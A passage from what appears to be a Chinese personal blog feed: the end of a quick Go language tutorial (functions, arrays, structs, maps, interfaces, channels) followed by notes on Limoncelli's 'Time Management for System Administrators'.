class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> oldMap &#123;</span><br><span class="line">    newMap[key] = value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>break，continue， goto</p><p>brk 和 ctnu 一样的功能，记得switch 也需要 brk</p><p>没想到这里还留着 goto ，一样的 <code>goto lable</code> ，一般不要乱跳，用来统一异常处理也行。</p></li><li><p><code>for true {fmt.print(&#39;dala&#39;)}</code></p></li></ul><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ul><li><p>和 C 一样，<code>main()</code> 为必须的函数入口。</p></li><li><p>函数定义格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">function_name</span><span class="params">( [parameter list] )</span> [<span class="title">return_types</span>]</span> &#123;</span><br><span class="line">   <span class="comment">//函数体</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span> <span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>多返回值 和python类似，可以进行多个值的返回</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">swap</span><span class="params">(x, y <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">string</span>, <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">   <span class="keyword">return</span> y, x</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 多个参数进行接收</span></span><br><span class="line">a,b := swap(<span class="string">"a"</span>, <span class="string">"sd"</span>)</span><br><span class="line">_,c := swap(<span class="string">"c"</span>, <span class="string">"ddd"</span>)</span><br></pre></td></tr></table></figure></li><li><p>值传递，和引用传递，类似于 CPP 语法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 定义交换值函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">swap</span><span class="params">(x *<span class="keyword">int</span>, y *<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> temp <span class="keyword">int</span></span><br><span class="line">   temp = *x    <span class="comment">/* 保持 x 地址上的值 */</span></span><br><span class="line">   *x = *y      <span class="comment">/* 将 y 值赋给 x */</span></span><br><span class="line">   *y = temp    <span class="comment">/* 将 temp 值赋给 y */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是直接传递引用的，如果在 CPP 的惯性下，可能更愿意理解为指针。</p></li></ul><h3 id="变量的作用域Scope"><a href="#变量的作用域Scope" class="headerlink" title="变量的作用域Scope"></a>变量的作用域Scope</h3><ul><li>局部变量，全局变量，形式变量。</li><li>全局变量可以在整个包甚至外部包（被导出后）使用。</li><li>同CPP里面的变量相同，记得初始化局部变量，全局变量，默认初始化为 0/nil</li></ul><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><ul><li><p>和其他语言一样，常见的顺序的数据结构。定义形式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明</span></span><br><span class="line"><span class="keyword">var</span> variable_name [SIZE] variable_type</span><br><span class="line"><span class="keyword">var</span> balance [<span class="number">10</span>] <span class="keyword">float32</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义形式比较诡异</span></span><br><span class="line"><span class="keyword">var</span> balance = [<span class="number">5</span>]<span class="keyword">float32</span>&#123;<span class="number">1000.0</span>, <span class="number">2.0</span>, <span class="number">3.4</span>, <span class="number">7.0</span>, <span class="number">50.0</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以很方便的使用 for range 进行遍历：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array := [<span class="number">5</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span> array &#123;</span><br><span class="line">fmt.Println(array[i])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>二维数组一样，行列的形式。</p></li><li><p>数组作为参数 使用 C 的惯性，写出以下的三种形式。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">func1</span><span class="params">(a []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> a[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// func2 在编译的时候是会报错的。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">func2</span><span class="params">(a *<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> a[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">func3</span><span class="params">(a [5]<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> a[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><ul><li>这里也是 Go 的精髓 ，保留了指针，但是为了保证稳定， 削减了其Hack 的灵活性</li><li>指针的内容大体上和 C 类似</li><li>空指针被定义为了 <code>nil</code></li><li>大体上的用法和 C 类似，如果具体讲起可能需要一本 《Go与指针》了XD</li><li><code>var pptr **int</code> 像是 <code>char ** argv</code> 一样的是存在的</li></ul><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><ul><li><p>这个在 Go 里面可是个好东西。当时在 C 里面辛辛苦苦一大堆的函数指针，图啥呢</p></li><li><p>其定义格式 以及初始化如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> struct_variable_type <span class="keyword">struct</span> &#123;</span><br><span class="line">   member definition;</span><br><span class="line">   member definition;</span><br><span class="line">   ...</span><br><span class="line">   member definition;</span><br><span class="line">&#125;</span><br><span class="line">variable_name := structure_variable_type &#123;value1, value2...valuen&#125;</span><br><span class="line"><span class="comment">// 成员名，可以作为键进行映射</span></span><br><span class="line">variable_name := structure_variable_type &#123; key1: value1, key2: value2..., keyn: valuen&#125;</span><br></pre></td></tr></table></figure></li><li><p>其用法和一般 OO语言类似</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Books <span class="keyword">struct</span> &#123;</span><br><span class="line">   title <span class="keyword">string</span></span><br><span class="line">   author <span class="keyword">string</span></span><br><span class="line">   subject <span class="keyword">string</span></span><br><span class="line">   book_id <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Book1 Books        <span class="comment">/* 声明 Book1 为 Books 类型 */</span></span><br><span class="line"><span class="keyword">var</span> Book2 Books        <span class="comment">/* 声明 Book2 为 Books 类型 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* book 1 描述 */</span></span><br><span class="line">Book1.title = <span class="string">"Go 语言"</span></span><br><span class="line">Book1.author = <span class="string">"www.runoob.com"</span></span><br><span class="line">Book1.subject = <span class="string">"Go 语言教程"</span></span><br><span class="line">Book1.book_id = <span class="number">6495407</span></span><br></pre></td></tr></table></figure></li><li><p>一样的存在结构体（对象）的指针。<strong>得力于GC不需要delete就不用紧张了</strong> </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Book1 books;</span><br><span class="line"><span class="keyword">var</span> struct_pointer *Books</span><br><span class="line">struct_pointer = &amp;Book1;</span><br><span class="line"></span><br><span class="line">a := book&#123;<span class="number">123</span>, <span class="number">456</span>&#125;</span><br><span class="line">b := book&#123;a: <span class="number">123</span>, b: <span class="number">123</span>&#125;</span><br><span class="line">fmt.Print(a, b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> book <span class="keyword">struct</span> &#123;</span><br><span class="line">a <span class="keyword">int</span></span><br><span class="line">b <span class="keyword">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><ul><li><p>很方便的提供了和python 的类似的 数组切片方式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s := arr[startIndex:endIndex]</span><br></pre></td></tr></table></figure></li><li><p><code>len()</code> 和 <code>cap()</code> 分别是获取数组元素个数，和可以容纳的最大元素数。</p></li><li><p><code>append()</code> 和 <code>copy()</code> </p><p>这里的数组是基础的元素，不能使用 append </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a := [<span class="number">5</span>]<span class="keyword">int</span>&#123;<span class="number">123</span>,<span class="number">123</span>,<span class="number">123</span>&#125;</span><br><span class="line">a.<span class="built_in">append</span>(<span class="number">123</span>) <span class="comment">// 这里报错</span></span><br><span class="line">a = <span class="built_in">append</span>(a, <span class="number">1</span>)</span><br><span class="line"><span class="comment">// 使用 make 可以创建一个新的数组</span></span><br><span class="line">b := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="built_in">len</span>(numbers), (<span class="built_in">cap</span>(numbers))*<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h3><ul><li>用于遍历结构的一个常用功能。 感觉类似 Python 的 range</li><li>range 会返回两个参数，分别是 index，和元素</li></ul><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><ul><li><p>和py一样的键值对</p></li><li><p>声明形式一样很奇怪</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 声明变量，默认 map 是 nil */</span></span><br><span class="line"><span class="keyword">var</span> map_variable <span class="keyword">map</span>[key_data_type]value_data_type</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用 make 函数 */</span></span><br><span class="line">map_variable := <span class="built_in">make</span>(<span class="keyword">map</span>[key_data_type]value_data_type)</span><br></pre></td></tr></table></figure></li><li><p>值得注意的是，键值的类型在声明的时候已经指定。</p></li><li><p>遍历键值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> country := <span class="keyword">range</span> countryCapitalMap &#123;</span><br><span class="line">    fmt.Println(country, <span class="string">"首都是"</span>, countryCapitalMap [country])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>GO 的错误处理，虽然不是这个部分的，不过从这里的代码细节可以看出，双返回值其中的一个内容就是错误码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">capital, ok := countryCapitalMap [ &quot;美国&quot; ] /*如果确定是真实的,则存在,否则不存在 */</span><br><span class="line">/*fmt.Println(capital) */</span><br><span class="line">/*fmt.Println(ok) */</span><br><span class="line">if (ok) &#123;</span><br><span class="line">    fmt.Println(&quot;美国的首都是&quot;, capital)</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    fmt.Println(&quot;美国的首都不存在&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><ul><li>Go 支持递归调用</li></ul><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><ul><li><p>接口是一种数据类型，</p></li><li><p>任何其他类型，只要实现了这些方法就是实现了这个接口</p></li><li><p>接口定义的示例代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 定义接口 */</span></span><br><span class="line"><span class="keyword">type</span> interface_name <span class="keyword">interface</span> &#123;</span><br><span class="line">   method_name1 [return_type]</span><br><span class="line">   method_name2 [return_type]</span><br><span class="line">   method_name3 [return_type]</span><br><span class="line">   ...</span><br><span class="line">   method_namen [return_type]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义结构体 */</span></span><br><span class="line"><span class="keyword">type</span> struct_name <span class="keyword">struct</span> &#123;</span><br><span class="line">   <span class="comment">/* variables */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 实现接口方法 */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(struct_name_variable struct_name)</span> <span class="title">method_name1</span><span class="params">()</span> [<span class="title">return_type</span>]</span> &#123;</span><br><span class="line">   <span class="comment">/* 方法实现 */</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(struct_name_variable struct_name)</span> <span class="title">method_namen</span><span class="params">()</span> [<span class="title">return_type</span>]</span> &#123;</span><br><span class="line">   <span class="comment">/* 方法实现*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>非侵入式 的接口。这里给了个例子，慢慢发现真的很精妙。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Phone <span class="keyword">interface</span> &#123;</span><br><span class="line">    call()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> NokiaPhone <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">                 fmt.Println(<span class="string">"I am Nokia, I can call you!"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> IPhone <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(iPhone IPhone)</span> <span class="title">call</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"I am iPhone, I can call you!"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> phone Phone<span class="comment">// 声明接口</span></span><br><span class="line">    phone = <span class="built_in">new</span>(NokiaPhone)<span class="comment">// 赋值到对象</span></span><br><span class="line">    phone.call()<span class="comment">// 调用接口</span></span><br><span class="line">    phone = <span class="built_in">new</span>(IPhone)</span><br><span class="line">    phone.call()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><ul><li><p>Go 的错误处理是接口特性的很好的体现</p></li><li><p>具体内容比较核心，属于语言特性，后面再深入学习</p></li></ul><h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><ul><li><p>Go 的极重要的特性</p></li><li><p>使用关键字 <code>go</code> 来启动 goruntine</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> foo(a,b,c)<span class="comment">// 有点像Node的异步</span></span><br><span class="line"><span class="keyword">go</span> foo1(x,y,z)</span><br></pre></td></tr></table></figure></li><li><p><strong>通道 Channel</strong></p><ul><li><p>用来传递数据的一个数据结构</p></li><li><p>用于两个 goroutine 之间的的值来同步和通信</p></li><li><p>通道声明：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line">ch &lt;- v    <span class="comment">// 把 v 发送到通道 ch</span></span><br><span class="line">v := &lt;-ch  <span class="comment">// 从 ch 接收数据</span></span><br><span class="line">           <span class="comment">// 并把值赋给 v</span></span><br></pre></td></tr></table></figure></li><li><p>通道缓存实例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 这里我们定义了一个可以存储整数类型的带缓冲通道</span></span><br><span class="line">        <span class="comment">// 缓冲区大小为2</span></span><br><span class="line">        ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 因为 ch 是带缓冲的通道，我们可以同时发送两个数据</span></span><br><span class="line">        <span class="comment">// 而不用立刻需要去同步读取数据</span></span><br><span class="line">        ch &lt;- <span class="number">1</span></span><br><span class="line">        ch &lt;- <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取这两个数据</span></span><br><span class="line">        fmt.Println(&lt;-ch)</span><br><span class="line">        fmt.Println(&lt;-ch)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>至此30分钟的教程完结，是自己针对有编程经验前提下的精简吧。</p><p>后面的并发，和错误处理的部分，是Go 的特性，还会进行详尽的学习。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/03/23/DEV_30min_for_Go/#disqus_thread</comments>
    </item>
    
    <item>
      <title>读本好书 《时间管理》</title>
      <link>https://www.diglp.xyz/2019/03/22/OP_Time_manage/</link>
      <guid>https://www.diglp.xyz/2019/03/22/OP_Time_manage/</guid>
      <pubDate>Thu, 21 Mar 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;这本书，在图书馆一个角落里发现的，一查还是相当经典的一本书。自己是 &lt;em&gt;*&lt;/em&gt;p
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这本书，在图书馆一个角落里发现的，一查还是相当经典的一本书。自己是 <em>*</em>p ，总觉得自己的确生活态度太随意了，过于理想。很多很多时候，已经明明安排好的事情，或者看似一小时能搞定的事情，往往得断断续续花上几天的时间。如果仅仅说是懒，自己还真是有点不相信了。</p><p>引用书里面的内容，自己的脑子在不断的进行上下文的切换， 在操作系统中，要求中断引起的上下文切换时间越短越好。可是倒在自己的脑子了发现没那么简单了。</p><p>可能大概看了五分钟的书，想着喝口水吧，喝完了水，回到座位想着玩会手机，玩着玩着，就不知道过了多久。所以可以见到，这个上下文切换的过程。简直是面临了ROP的攻击。不知道之前的看书的返回到哪里去了。</p><p>越发觉得，自己的时间管理的概念需要建立起来，还好现在也不晚。所以借着这本书有个初步的接触，自己没事要念念不忘。对了，这本书有一点好，后面的破折号写着 l<strong>给系统管理员(SA)</strong> 也就是 <code>System and networking Administrator</code>  。虽然现在没有SA了不过现在OPS的性质河那时候倒是有些相像 —— 一个又一个的 <code>int 21</code></p><p>在搜索引擎上面倒是也得到了一些方案比如这个 <span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JUIwJUJEJUU3JUFFJUExJUU1JThFJUJCJUU1JTgxJTlB" title="https://zh.wikipedia.org/wiki/%E5%B0%BD%E7%AE%A1%E5%8E%BB%E5%81%9A">GTD<i class="fa fa-external-link"></i></span> （<strong>Getting Things Done</strong>） ，这里的部分的概念，在书是有提到的。</p><blockquote><p> 两分钟原则：任何事情如果花的时间少于两分钟，那么马上就去做。两分钟是一个分水岭，这样的时间和正式地推迟一个动作所花的时间差不多。</p></blockquote><p>所以开始慢慢的执行自己的时间管理吧，从这本书开始。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：时间管理 ——给系统管理员</li><li>作者：Thomas A.  Limoncelli</li><li>ISBN：9 787564 109059</li></ul><blockquote><p>现在，做好了，把手放在驾驶盘上，放开手刹车，享受吧，让Tom给你的世界带来时间管理和清明。</p></blockquote><p>摘自序。</p><hr><p>来自 O’REILLY 的书 ，其封面是狼獾，强壮，狡猾，无畏，贪婪。</p><h2 id="时间管理原则"><a href="#时间管理原则" class="headerlink" title="时间管理原则"></a>时间管理原则</h2><p>这个是本书的第一章，其原则有以下几条：</p><ul><li>信息统一管理，reminder</li><li>脑力留给最重要的事情</li><li>不要造轮子，积极复用</li><li>形成习惯和信念</li><li>项目期间保持专注</li><li>社交不是一个可选功能</li></ul><hr><p>每个人都被忠告要避免拖延，需要记住的是，拖延是人的天性，它来自于<strong>惧怕和缺乏信心</strong>。</p><h2 id="专心对待干扰"><a href="#专心对待干扰" class="headerlink" title="专心对待干扰"></a>专心对待干扰</h2><p>在工作的时候一直有各种个月的中断。就如前面说的观点，干扰 t 分钟，然而浪费的时间，是加上恢复工作状态，加上找到工作进度的总和 <code>t+p+s</code>。</p><p>把记忆交给工具，把自己想的东西写下来这样就可以专心的去做当前的事情。</p><hr><p><strong>凌乱的桌面也会充满着各种的干扰</strong> ，当你犹豫，就丢掉它。对于桌面的整理计划：</p><ul><li>把可以归档的文件归档</li><li>把未完成的羡慕放在即将完成的堆里</li><li>把剩下的所有的东西，放在一个大信封里面，上面注明，如果三个月没打开就丢掉它。</li></ul><blockquote><ul><li>当你犹豫，就扔掉它。如果将来你需要，可以找来源处要复制品。</li><li>当我必须完成工作时，就少玩计算机游戏，远离即时通讯软件。</li></ul></blockquote><hr><p>充分利用好没有干扰的时间，比如办公室里早早到的那一个小时。</p><hr><p>学会丢锅，（把干扰源转移）<strong>说“走开”，而不用当一个混蛋</strong>：</p><ul><li>表示事件重视，先记下来</li><li>客户想看到行动而不是收到行动（把自己的解决问题的过程尽量可视化)</li></ul><p>在项目里面受到干扰的时候，可以有以下的几种选择：</p><ul><li><p>委派它</p><p>嗨，xxx，他那里的web服务器问题有点复杂，我现在让他去你那边</p></li><li><p>记录它</p><p>加入 todo 队列</p><p>走廊里的埋伏（就是突然xxx，这里有个事情想问问你）</p></li><li><p>执行它</p><p>业务重大的 Outage 的时候，需要马上执行，但是至少花点时间记录工作。</p></li></ul><hr><p>书里面除了时间管理甚至还有些technical的建议：</p><blockquote><p>最奇怪的问题通常发生在错误的配置DNS</p></blockquote><h2 id="例行公事"><a href="#例行公事" class="headerlink" title="例行公事"></a>例行公事</h2><p>养成一些习惯，变成自己的公事，降低了自己的执行成本。而且减少做决定的时间。比如工作上的周报？</p><blockquote><p>没有人临死前的想法会是:天啊,我真希望多花点时间待在在办公室.</p></blockquote><h2 id="循环系统"><a href="#循环系统" class="headerlink" title="循环系统"></a>循环系统</h2><p>一般 上使用的记事系统不怎么管用。包括：</p><ul><li>分布笔记系统  (Scattered Notes System)    :happy:</li><li>毁灭型永续增长工作表（Ever-Growing To Do List of Doom） :happy:</li></ul><p>这上面就是自己的记录表，到最后都爆炸了。</p><blockquote><ul><li>这完全事扼杀自尊的行为，你永远不会得到完成列表的成就感</li></ul></blockquote><p>这里作者安利了 PDA ，理解为我们的 Reminder 吧 </p><hr><p>后面的部分就是介绍这个 时间表的功能，不过可能个人感触不大吧。可能当时写这个书的时候，智能手机没有诞生，所以随身一个，可以记录，完成，时间，优先级的东西就显得特别重要。现在呢？拿出手机就是啦 </p><hr><p>文中这里分了 工作表与时间表，日程表管理，生活目标 这几个方面写循环系统的。</p><h2 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h2><p>优先级，可以理解是我们显示的时间上的 <code>QoS</code> (quality of service) ，负载轻盈的时候，什么都可以做好，负载高的时候，则需要更多的结构性的东西。再进一步理解为QoS的封包。等缓冲区满的时候，QoS 在缓冲队列中丢弃一个优先级较低的包。优先级管理类似。</p><p><strong>根据客户期望调节优先等级</strong></p><hr><h4 id="管理上司"><a href="#管理上司" class="headerlink" title="管理上司"></a>管理上司</h4><p>书中写道，管理不一定是单行道。管理是一种关系。所以就有了 <strong>manage your boss</strong> 的理论。</p><blockquote><p>管理你的上司的三个要见就是：让他协助你发展职涯，知道合适用往上委派，以及了解其目标并作出贡献。</p></blockquote><h2 id="压力管理"><a href="#压力管理" class="headerlink" title="压力管理"></a>压力管理</h2><p>学会释放自己的压力，使用适合的方法：</p><ul><li>瑜伽</li><li>冥想</li><li>按摩</li></ul><p>吸烟的人压力较之比较小，因为会过段时间到室外走走，当然治理不鼓励吸烟，只是希望：<strong>过段时间到工作区以外的地方走走</strong>。</p><h2 id="E-mail-管理"><a href="#E-mail-管理" class="headerlink" title="E-mail 管理"></a>E-mail 管理</h2><p>这个是遇到的比较爆炸的问题，看着 唯独的条数不断爆炸，毫无办法。</p><blockquote><p>建议是让收件夹保持干净。</p></blockquote><ul><li>可以每天在15分钟把所有的邮件给读完。</li><li>存档邮件，一个时间段的邮件从收件箱搬走</li></ul><h2 id="排除浪费时间的事件"><a href="#排除浪费时间的事件" class="headerlink" title="排除浪费时间的事件"></a>排除浪费时间的事件</h2><blockquote><p>把浪费时间的事件定义为任何得益和所花时间之比太低的活动</p></blockquote><p>例如，花同样的时间做些家中的维修工作来增加你的生活质量，比起炸掉几百万个古怪的机器人更加有长期的益处。</p><h3 id="避免有诱惑力的浪费时间事件"><a href="#避免有诱惑力的浪费时间事件" class="headerlink" title="避免有诱惑力的浪费时间事件"></a>避免有诱惑力的浪费时间事件</h3><p>这点是相当的重要的了，经常的听自己说：<strong>我只玩一分钟的电子游戏</strong> 